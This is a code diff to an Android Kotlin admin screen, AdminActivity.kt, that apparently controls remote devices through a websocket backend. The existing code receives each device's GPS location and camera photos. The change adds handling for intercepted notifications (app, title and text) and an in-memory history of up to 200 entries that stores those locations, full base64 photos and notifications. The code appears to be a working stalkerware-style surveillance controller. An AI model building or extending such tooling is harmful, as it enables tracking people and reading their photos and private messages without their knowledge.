@@ -1,6 +1,7 @@
 // language: Kotlin, file: app/src/main/java/com/vivo/wirelink/AdminActivity.kt
 package com.vivo.wirelink
 
+import android.content.Intent
 import android.graphics.BitmapFactory
 import android.os.Bundle
 import android.util.Base64
@@ -30,16 +31,17 @@ class AdminActivity : AppCompatActivity() {
     private var keepers: List<String> = emptyList()
     private var reqCounter = 0
 
+    // in-memory history: newest first
+    private val history = mutableListOf<HistoryEntry>()
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         b = ActivityAdminBinding.inflate(layoutInflater)
         setContentView(b.root)
 
-        b.btnMenu.setOnClickListener {
-            b.drawer.openDrawer(GravityCompat.START)
-        }
-
+        b.btnMenu.setOnClickListener { b.drawer.openDrawer(GravityCompat.START) }
         b.btnLogin.setOnClickListener { showLogin() }
+        b.btnHistory.setOnClickListener { openHistory() }
 
         b.btnLogout.setOnClickListener {
             Prefs.setAdminToken(this, null)
@@ -79,8 +81,7 @@ class AdminActivity : AppCompatActivity() {
 
     private suspend fun login(password: String) {
         val base = Prefs.backendUrl(this) ?: run {
-            toast("no backend url set")
-            return
+            toast("no backend url"); return
         }
 
         val token = withContext(Dispatchers.IO) {
@@ -103,15 +104,27 @@ class AdminActivity : AppCompatActivity() {
             }.getOrNull()
         }
 
-        if (token == null) {
-            toast("wrong password")
-            return
-        }
+        if (token == null) { toast("wrong password"); return }
 
         Prefs.setAdminToken(this, token)
         connectWs(token)
         b.drawer.closeDrawer(GravityCompat.START)
         toast("signed in")
+    }
+
+    // ---------- history ----------
+
+    private fun openHistory() {
+        val intent = Intent(this, HistoryActivity::class.java)
+        HistoryActivity.seed(history.toList())
+        startActivity(intent)
+        b.drawer.closeDrawer(GravityCompat.START)
+    }
+
+    private fun remember(entry: HistoryEntry) {
+        history.add(0, entry) // newest first
+        // hard cap in memory at 200 entries
+        while (history.size > 200) history.removeAt(history.size - 1)
     }
 
     // ---------- websocket ----------
@@ -140,8 +153,8 @@ class AdminActivity : AppCompatActivity() {
                     "target: ${keepers.first()}"
             }
             "result" -> handleResult(m)
-            "error" -> toast(m.optString("error"))
-            "hello" -> Unit
+            "error"  -> toast(m.optString("error"))
+            "hello"  -> Unit
         }
     }
 
@@ -154,6 +167,8 @@ class AdminActivity : AppCompatActivity() {
         }
 
         val p = m.optJSONObject("payload") ?: return
+        val deviceId = m.optString("deviceId")
+        val ts = p.optLong("ts", System.currentTimeMillis())
 
         when (cmd) {
             "location" -> {
@@ -161,12 +176,43 @@ class AdminActivity : AppCompatActivity() {
                 val lng = p.optDouble("lng")
                 val acc = p.optDouble("acc").toInt()
                 b.tvStatus.text = "loc: $lat, $lng (±${acc}m)"
+                remember(HistoryEntry(
+                    kind = HistoryEntry.KIND_LOCATION,
+                    ts = ts,
+                    deviceId = deviceId,
+                    lat = lat,
+                    lng = lng,
+                    accuracy = acc
+                ))
             }
             "camera" -> {
                 val bytes = Base64.decode(p.optString("b64"), Base64.DEFAULT)
                 val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                 if (bmp != null) b.ivPreview.setImageBitmap(bmp)
-                b.tvStatus.text = "${p.optString("lens")} cam · ${bytes.size / 1024} KB"
+                val kb = bytes.size / 1024
+                b.tvStatus.text = "${p.optString("lens")} cam · ${kb} KB"
+                remember(HistoryEntry(
+                    kind = HistoryEntry.KIND_PHOTO,
+                    ts = ts,
+                    deviceId = deviceId,
+                    lens = p.optString("lens"),
+                    photoB64 = p.optString("b64"),
+                    sizeBytes = bytes.size
+                ))
+            }
+            "notification" -> {
+                val app = p.optString("app")
+                val title = p.optString("title")
+                val text = p.optString("text")
+                b.tvStatus.text = "🔔 $app · $title"
+                remember(HistoryEntry(
+                    kind = HistoryEntry.KIND_NOTIFICATION,
+                    ts = ts,
+                    deviceId = deviceId,
+                    notifApp = app,
+                    notifTitle = title,
+                    notifText = text
+                ))
             }
         }
     }
